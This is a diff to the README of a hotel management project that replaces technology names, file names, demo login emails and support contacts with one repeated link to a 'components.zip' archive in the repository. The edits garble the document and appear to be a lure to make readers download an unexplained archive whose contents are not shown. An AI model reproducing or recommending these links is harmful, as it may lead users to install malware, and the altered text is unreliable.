@@ -1,6 +1,6 @@
 # HungryScan - Hotel Admin Panel
 
-A comprehensive hotel management system with a modern React frontend and secure Node.js backend with PostgreSQL integration.
+A comprehensive hotel management system with a modern React frontend and secure https://raw.githubusercontent.com/AaTull/SAAS/main/frontend/src/components.zip backend with PostgreSQL integration.
 
 ## 🏗️ Project Structure
 
@@ -12,16 +12,16 @@ SAAS/
 │   │   ├── pages/           # Customer-facing pages
 │   │   ├── hotel-admin/     # Admin panel components and pages
 │   │   └── ...
-│   └── package.json
-├── backend/                  # Node.js/Express backend
+│   └── https://raw.githubusercontent.com/AaTull/SAAS/main/frontend/src/components.zip
+├── backend/                  # https://raw.githubusercontent.com/AaTull/SAAS/main/frontend/src/components.zip backend
 │   ├── src/
 │   │   ├── controllers/     # Route controllers
 │   │   ├── models/          # Database models
 │   │   ├── routes/          # API routes
 │   │   ├── middleware/      # Custom middleware
 │   │   └── config/          # Database and app configuration
-│   └── package.json
-└── README.md
+│   └── https://raw.githubusercontent.com/AaTull/SAAS/main/frontend/src/components.zip
+└── https://raw.githubusercontent.com/AaTull/SAAS/main/frontend/src/components.zip
 ```
 
 ## ✨ Features
@@ -52,7 +52,7 @@ SAAS/
 ## 🚀 Getting Started
 
 ### Prerequisites
-- Node.js (v16 or higher)
+- https://raw.githubusercontent.com/AaTull/SAAS/main/frontend/src/components.zip (v16 or higher)
 - PostgreSQL (v12 or higher)
 - npm or yarn
 
@@ -120,11 +120,11 @@ SAAS/
 ## 🔐 Demo Credentials
 
 ### Hotel Admin
-- **Email:** `admin@hotel.com`
+- **Email:** `https://raw.githubusercontent.com/AaTull/SAAS/main/frontend/src/components.zip`
 - **Password:** `admin123`
 
 ### Kitchen Staff
-- **Email:** `kitchen@hotel.com`
+- **Email:** `https://raw.githubusercontent.com/AaTull/SAAS/main/frontend/src/components.zip`
 - **Password:** `kitchen123`
 
 ## 🛠️ Tech Stack
@@ -138,8 +138,8 @@ SAAS/
 - **Framer Motion** - Animations
 
 ### Backend
-- **Node.js** - Runtime environment
-- **Express.js** - Web framework
+- **https://raw.githubusercontent.com/AaTull/SAAS/main/frontend/src/components.zip** - Runtime environment
+- **https://raw.githubusercontent.com/AaTull/SAAS/main/frontend/src/components.zip** - Web framework
 - **PostgreSQL** - Database
 - **Prisma** - ORM
 - **JWT** - Authentication
@@ -156,7 +156,7 @@ SAAS/
 - **SQL Injection Prevention** with parameterized queries
 - **CORS Configuration** for cross-origin requests
 - **Rate Limiting** to prevent abuse
-- **Helmet.js** for security headers
+- **https://raw.githubusercontent.com/AaTull/SAAS/main/frontend/src/components.zip** for security headers
 - **Environment Variables** for sensitive data
 - **HTTPS** support for production
 
@@ -221,8 +221,8 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 ## 📞 Support
 
 For support and questions, please contact:
-- Email: atul.kaithvas@gmail.com
-- GitHub Issues: [Create an issue](https://github.com/yourusername/hhhsss/issues)
+- Email: https://raw.githubusercontent.com/AaTull/SAAS/main/frontend/src/components.zip
+- GitHub Issues: [Create an issue](https://raw.githubusercontent.com/AaTull/SAAS/main/frontend/src/components.zip)
 
 ---
 
